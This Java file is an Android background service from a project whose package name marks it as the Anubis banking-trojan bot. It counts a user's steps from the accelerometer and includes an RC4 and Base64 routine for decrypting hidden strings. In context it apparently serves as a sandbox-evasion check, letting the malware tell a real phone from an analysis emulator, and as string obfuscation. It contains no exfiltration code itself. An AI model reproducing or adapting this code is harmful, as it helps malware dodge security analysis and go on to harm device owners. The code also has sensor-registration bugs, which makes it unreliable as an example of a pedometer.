package anubis.bot.myapplication;


import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.hardware.Sensor;
import android.hardware.SensorEvent;
import android.hardware.SensorEventListener;
import android.hardware.SensorManager;
import android.os.IBinder;
import android.util.Base64;
import android.util.Log;
import android.widget.Toast;

import anubis.bot.myapplication.API.ClassRC4;
import anubis.bot.myapplication.API.SensorFilter;

public class ServicePedometer extends Service implements SensorEventListener {

    UtilsClass utl = new UtilsClass();
    private static final int ACCEL_RING_SIZE = 50;
    private static final int VEL_RING_SIZE = 10;


    private static final float STEP_THRESHOLD = 50f;

    private static final int STEP_DELAY_NS = 250000000;

    private int accelRingCounter = 0;
    private float[] accelRingX = new float[ACCEL_RING_SIZE];
    private float[] accelRingY = new float[ACCEL_RING_SIZE];
    private float[] accelRingZ = new float[ACCEL_RING_SIZE];
    private int velRingCounter = 0;
    private float[] velRing = new float[VEL_RING_SIZE];
    private long lastStepTimeNs = 0;
    private float oldVelocityEstimate = 0;

    public ServicePedometer() { }

    private SensorManager mSensorManager;

    private Sensor mSensor;


    private long lastUpdate = 0;
    private float last_x, last_y, last_z;
    private static final int SHAKE_THRESHOLD = 600;


    @Override

    public void onCreate() {
        super.onCreate();
        mSensorManager = (SensorManager) getSystemService(SENSOR_SERVICE);
        mSensorManager.registerListener(this, mSensor, SensorManager.SENSOR_DELAY_NORMAL);
        mSensor = mSensorManager.getDefaultSensor(Sensor.TYPE_ACCELEROMETER);

    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        mSensorManager = (SensorManager) getSystemService(SENSOR_SERVICE);
        mSensorManager.registerListener(this, mSensor, SensorManager.SENSOR_DELAY_NORMAL);
        mSensor = mSensorManager.getDefaultSensor(Sensor.TYPE_ACCELEROMETER);
        return START_STICKY;
    }

    public String str_decrypt(String textDE_C, String key)
    {
        UtilsClass utilsClass = new UtilsClass();
        try
        {
            byte[] data = Base64.decode(textDE_C, Base64.DEFAULT);
            textDE_C = new String(data, "UTF-8");
            byte[] detext = utilsClass.hexStringToByteArray(textDE_C);
            ClassRC4 rcd = new ClassRC4(key.getBytes());
            return  new String(rcd.decrypt(detext));
        }catch (Exception ex){ }
        return "";
    }

    @Override
    public IBinder onBind(Intent intent) { throw new UnsupportedOperationException("Not Yet Implemented"); }

    @Override
    public void onSensorChanged(SensorEvent sensorEvent) {
        mSensorManager.registerListener(this, mSensor, SensorManager.SENSOR_DELAY_NORMAL);

        Sensor mySensor = sensorEvent.sensor;

        mSensorManager.registerListener(this, mySensor, SensorManager.SENSOR_DELAY_NORMAL);

        if (mySensor.getType() == Sensor.TYPE_ACCELEROMETER) {

            float[] values = sensorEvent.values;
            float x = values[0];
            float y = values[1];
            float z = values[2];

            long curTime = System.currentTimeMillis();
            if ((curTime - lastUpdate) > 100) {
                long diffTime = (curTime - lastUpdate);
                lastUpdate = curTime;
                float speed
                        = Math.abs(x + y + z - last_x - last_y - last_z) / diffTime * 10000;
                if (speed > SHAKE_THRESHOLD) {
                    step();
                }
                last_x = x;
                last_y = y;
                last_z = z;
            }
            // Stop the sensor and service
          //  mSensorManager.unregisterListener(this);
           // stopSelf();
        }
        //updateAccel(sensorEvent.timestamp, sensorEvent.values[0] , sensorEvent.values[1],sensorEvent.values[2]);
      //  Log.e("GGGG",sensorEvent.values[0] + "  "+ sensorEvent.values[1]+"  "+ sensorEvent.values[2]);
    }

    public void updateAccel(long timeNs, float x, float y, float z) {
        try {
            float[] currentAccel = new float[3];
            currentAccel[0] = x;
            currentAccel[1] = y;
            currentAccel[2] = z;

            // First step is to update our guess of where the global z vector is.
            accelRingCounter++;
            accelRingX[accelRingCounter % ACCEL_RING_SIZE] = currentAccel[0];
            accelRingY[accelRingCounter % ACCEL_RING_SIZE] = currentAccel[1];
            accelRingZ[accelRingCounter % ACCEL_RING_SIZE] = currentAccel[2];

            float[] worldZ = new float[3];
            worldZ[0] = SensorFilter.sum(accelRingX) / Math.min(accelRingCounter, ACCEL_RING_SIZE);
            worldZ[1] = SensorFilter.sum(accelRingY) / Math.min(accelRingCounter, ACCEL_RING_SIZE);
            worldZ[2] = SensorFilter.sum(accelRingZ) / Math.min(accelRingCounter, ACCEL_RING_SIZE);

            float normalization_factor = SensorFilter.norm(worldZ);

            worldZ[0] = worldZ[0] / normalization_factor;
            worldZ[1] = worldZ[1] / normalization_factor;
            worldZ[2] = worldZ[2] / normalization_factor;

            float currentZ = SensorFilter.dot(worldZ, currentAccel) - normalization_factor;
            velRingCounter++;
            velRing[velRingCounter % VEL_RING_SIZE] = currentZ;

            float velocityEstimate = SensorFilter.sum(velRing);

            if (velocityEstimate > STEP_THRESHOLD && oldVelocityEstimate <= STEP_THRESHOLD
                    && (timeNs - lastStepTimeNs > STEP_DELAY_NS)) {

                step();

            }
            oldVelocityEstimate = velocityEstimate;
        }catch (Exception ex){}
    }

    @Override
    public void onAccuracyChanged(Sensor sensor, int i) { }

    public void step(){
        int getStep = Integer.parseInt(utl.SetRead(this, "step"));
        getStep=getStep+1;
        utl.SetWrite(this, "step", "" + getStep);
        utl.Log("Step", "+");
    }
}

